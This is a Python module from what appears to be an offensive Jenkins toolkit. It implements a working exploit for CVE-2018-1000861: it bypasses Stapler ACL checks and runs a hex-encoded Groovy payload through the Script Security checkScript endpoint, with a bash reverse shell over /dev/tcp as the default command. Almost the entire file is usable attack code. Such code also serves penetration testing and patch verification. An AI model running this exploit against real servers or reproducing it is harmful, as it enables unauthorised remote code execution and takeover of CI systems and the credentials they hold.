"""
CVE-2018-1000861: Jenkins Stapler ACL Bypass and RCE

This exploit leverages a vulnerability in the Stapler web framework to bypass ACL checks
and execute arbitrary code via the Script Security plugin's checkScript endpoint.
"""

from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2018_1000861(ExploitModule):
    """Jenkins Stapler ACL bypass combined with Script Security RCE."""

    CVE_ID = "CVE-2018-1000861"

    METADATA = ExploitMetadata(
        cve_id="CVE-2018-1000861",
        name="Jenkins Stapler ACL Bypass and RCE",
        description="ACL bypass via Stapler routing combined with Script Security RCE",
        affected_versions=["<= 2.137", "<= 2.121.3 LTS"],
        mitre_attack=["T1190", "T1059"],
        severity="critical",
        references=[
            "https://jenkins.io/security/advisory/2018-12-05/",
            "https://nvd.nist.gov/vuln/detail/CVE-2018-1000861",
            "https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2018-1000861/poc.py"
        ],
        requires_auth=False,
        requires_crumb=False,
        tags=["rce", "acl-bypass", "groovy"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/securityRealm/user/admin/")
            if response.status_code == 200 and 'adjuncts' in response.text:
                return True

            response = session.get("/")
            if response.status_code == 200 and 'adjuncts' in response.text:
                return True
        except Exception:
            pass
        return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2018-1000861 for ACL bypass and RCE.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (lhost, lport, cmd)

        Returns:
            ExploitResult: Result of the exploit
        """
        lhost = kwargs.get('lhost')
        lport = kwargs.get('lport')
        cmd = kwargs.get('cmd', f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' if lhost and lport else None)

        if not cmd:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details="No command provided (lhost/lport or cmd required)",
                error="Missing required parameter: cmd or lhost+lport"
            )

        endpoint = 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'

        anonymous_read = False
        acl_bypass = False
        exploit_url = None

        try:
            response = session.get("/")
            if response.status_code == 200 and 'adjuncts' in response.text:
                anonymous_read = True
                exploit_url = session.base_url
        except Exception:
            pass

        if not anonymous_read:
            try:
                bypass_url = f"{session.base_url}/securityRealm/user/admin"
                response = session.get("/securityRealm/user/admin/")
                if response.status_code == 200 and 'adjuncts' in response.text:
                    acl_bypass = True
                    exploit_url = bypass_url
            except Exception:
                pass

        if not exploit_url:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="failure",
                details="Neither ANONYMOUS_READ nor ACL bypass available"
            )

        check_endpoint_path = f"/{endpoint}" if not exploit_url.endswith('/') else endpoint
        f"{exploit_url.rstrip('/')}/{endpoint}"

        try:
            response = session.get(check_endpoint_path)
            if response.status_code == 404:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="checkScript endpoint not found (Script Security plugin not installed)"
                )
        except Exception:
            pass

        cmd_hex = cmd.encode('utf-8').hex()
        payload = f'public class x{{public x(){{new String("{cmd_hex}".decodeHex()).execute()}}}}'

        params = {
            'sandbox': 'true',
            'value': payload
        }

        try:
            response = session.get(check_endpoint_path, params=params)

            if response.status_code == 200:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details=f"Command executed via {'ANONYMOUS_READ' if anonymous_read else 'ACL bypass'}",
                    data={
                        "command": cmd,
                        "method": "ACL bypass" if acl_bypass else "ANONYMOUS_READ",
                        "endpoint": endpoint
                    }
                )
            elif response.status_code == 405:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="Jenkins has patched the RCE gadget (method not allowed)"
                )
            else:
                details = f"Exploit failed with HTTP status {response.status_code}"
                if 'Caused:' in response.text:
                    for line in response.text.splitlines():
                        if line.startswith('Caused:'):
                            details += f" - {line}"
                            break
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=details
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Execution error: {str(e)}"
            )
